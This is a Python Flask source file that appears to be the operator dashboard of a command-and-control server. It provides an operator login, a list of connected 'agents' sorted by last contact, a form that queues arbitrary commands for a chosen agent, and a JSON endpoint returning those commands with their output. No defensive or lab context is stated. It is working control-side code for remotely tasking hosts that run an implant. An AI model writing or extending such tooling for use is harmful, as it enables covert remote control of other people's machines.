from functools import wraps
from flask import (
    Blueprint, render_template, request, redirect,
    url_for, session, flash, jsonify
)
from c2.models import db, Agent, Task
from config import Config

dash_bp = Blueprint("dash", __name__)


def login_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not session.get("logged_in"):
            return redirect(url_for("dash.login"))
        return f(*a, **kw)
    return wrapper


@dash_bp.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if (request.form["username"] == Config.OPERATOR_USER and
                request.form["password"] == Config.OPERATOR_PASS):
            session["logged_in"] = True
            return redirect(url_for("dash.dashboard"))
        flash("Invalid credentials")
    return render_template("login.html")


@dash_bp.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("dash.login"))


@dash_bp.route("/")
@login_required
def dashboard():
    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
    return render_template("dashboard.html", agents=agents)


@dash_bp.route("/agent/<uid>")
@login_required
def agent_view(uid):
    agent = Agent.query.filter_by(uid=uid).first_or_404()
    tasks = Task.query.filter_by(agent_uid=uid).order_by(Task.issued_at.desc()).all()
    return render_template("agent.html", agent=agent, tasks=tasks)


@dash_bp.route("/agent/<uid>/task", methods=["POST"])
@login_required
def issue_task(uid):
    cmd = request.form.get("command", "").strip()
    if cmd:
        db.session.add(Task(agent_uid=uid, command=cmd))
        db.session.commit()
    return redirect(url_for("dash.agent_view", uid=uid))


@dash_bp.route("/agent/<uid>/tasks")
@login_required
def poll_tasks(uid):
    tasks = Task.query.filter_by(agent_uid=uid).order_by(Task.issued_at.desc()).all()
    return jsonify([{
        "id": t.id,
        "command": t.command,
        "output": t.output,
        "status": t.status,
        "issued_at": t.issued_at.isoformat(),
    } for t in tasks])
